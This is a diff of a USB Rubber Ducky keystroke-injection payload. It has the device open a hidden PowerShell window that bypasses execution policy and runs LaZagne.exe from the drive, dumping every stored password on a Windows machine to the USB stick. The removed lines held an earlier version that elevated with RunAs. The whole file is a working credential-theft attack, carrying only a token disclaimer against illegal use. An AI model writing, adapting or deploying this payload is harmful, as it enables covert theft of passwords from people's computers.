@@ -1,14 +1,10 @@
-REM Runs LaZagene executable stored on Rubber Ducky (Windows)
-REM AUTHOR Crashwire
-REM DESCRIPTION: Utilizes cmd to run LaZagne.exe stored on the D: Drive (Rubber Ducky) and output results to D: Drive.  
-REM Download .exe from https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.6 **May trigger AV**
+REM Author: Crashwire
+REM Description: Uses LaZange.exe (stored on the D: drive) to extract all passwords and output file to the D: drive 
+REM Note: LaZange Runs for a LONG time, so patience is a virtue on this payload
 REM **DO NOT USE FOR ILLEGAL PURPOSES**
 ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
-DELAY 200
-STRING powershell -WindowStyle Hidden -Command "Start-Process PowerShell -ArgumentList '-WindowStyle Hidden -Command \"Start-Process cmd -ArgumentList ''/c D: && .\\LaZagne.exe all -quiet -oA -output D:\\lazagne_output.txt'' -Verb RunAs\"'"
-ENTER
-DELAY 30000
-STRING exit
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& D:\LaZagne.exe all -oN -output D:\"
 ENTER
